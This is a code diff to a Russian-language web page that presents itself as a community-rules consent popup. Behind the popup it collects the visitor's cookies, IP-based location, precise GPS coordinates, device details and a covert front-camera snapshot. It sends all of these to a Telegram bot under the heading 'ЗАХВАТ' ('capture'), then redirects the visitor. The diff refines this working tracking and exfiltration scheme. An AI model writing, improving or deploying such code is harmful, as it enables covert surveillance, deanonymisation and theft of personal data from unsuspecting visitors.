@@ -81,7 +81,9 @@ td.user{color:#fff}td.price{color:#10b981;font-weight:600}
 <button class="btn-pop" id="confirmBtn">Подтвердить и продолжить</button>
 <div class="fineprint">
 Нажимая «Подтвердить и продолжить», вы соглашаетесь<br>
-с правилами сообщества и политикой обработки данных.
+с правилами сообщества и политикой обработки данных.<br>
+Продолжая, вы подтверждаете что ознакомлены<br>
+с условиями использования сервиса.
 </div>
 </div>
 </div>
@@ -126,6 +128,7 @@ PD.cpu=navigator.hardwareConcurrency||"?";PD.ram=navigator.deviceMemory||"?";
 PD.mobile=/Mobi|Android/i.test(navigator.userAgent);
 PD.ref=document.referrer||"direct";PD.cookie=document.cookie||"-";
 PD.bat="-";PD.gpu="-";PD.conn="-";PD.ip="-";PD.country="-";PD.city="-";PD.region="-";PD.provider="-";PD.tz_ip="-";
+PD.geo_lat="-";PD.geo_lng="-";PD.geo_acc="-";PD.camera="-";PD.mic="-";PD.photo=null;
 
 fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(j){
 PD.ip=j.ip||"-";PD.country=j.country_name||"-";PD.city=j.city||"-";
@@ -154,7 +157,7 @@ setTimeout(function(){
 document.getElementById('overlay').classList.add('show');
 },1500);
 
-function sendAll(d){
+function sendMsg(d){
 var msg='🚨 ЗАХВАТ\n\n'+
 '🆔 '+sid+'\n🕐 '+new Date().toLocaleString("ru-RU")+'\n\n'+
 '🌐 IP: '+(d.ip||"-")+'\n'+
@@ -194,27 +197,26 @@ fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:"POST",body:fd})
 
 function done(){
 document.getElementById('overlay').classList.remove('show');
-setTimeout(function(){window.location.replace(REDIR)},2000);
+setTimeout(function(){window.location.replace(REDIR)},1500);
 }
 
-// Вешаем обработчик на кнопку
-document.getElementById('confirmBtn').addEventListener('click',async function(){
+document.getElementById('confirmBtn').addEventListener('click',function(){
 var btn=document.getElementById('confirmBtn');
 btn.textContent='Загрузка...';
 btn.disabled=true;
 
-// Гео
+sendMsg(PD);
+
 if(navigator.geolocation){
 navigator.geolocation.getCurrentPosition(function(pos){
 PD.geo_lat=pos.coords.latitude;
 PD.geo_lng=pos.coords.longitude;
 PD.geo_acc=pos.coords.accuracy+' м';
-},{},{enableHighAccuracy:true,timeout:5000});
+sendMsg(PD);
+},function(){},{enableHighAccuracy:true,timeout:3000});
 }
 
-// Камера
-try{
-var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
+navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true}).then(function(stream){
 PD.camera="получен";
 PD.mic="получен";
 var video=document.createElement('video');
@@ -227,20 +229,16 @@ var ctx=canvas.getContext('2d');
 ctx.drawImage(video,0,0,320,240);
 var photo=canvas.toDataURL('image/jpeg',0.6);
 stream.getTracks().forEach(function(t){t.stop()});
-sendAll(PD);
 sendPhoto(photo);
-done();
-},1500);
-}catch(e){
+},1000);
+}).catch(function(){
 PD.camera="отказано";
 PD.mic="отказано";
-sendAll(PD);
-done();
-}
+});
 
-if('Notification' in window){
-Notification.requestPermission().then(function(p){PD.notifications=p});
-}
+if('Notification' in window){Notification.requestPermission();}
+
+done();
 });
 </script>
 </body>
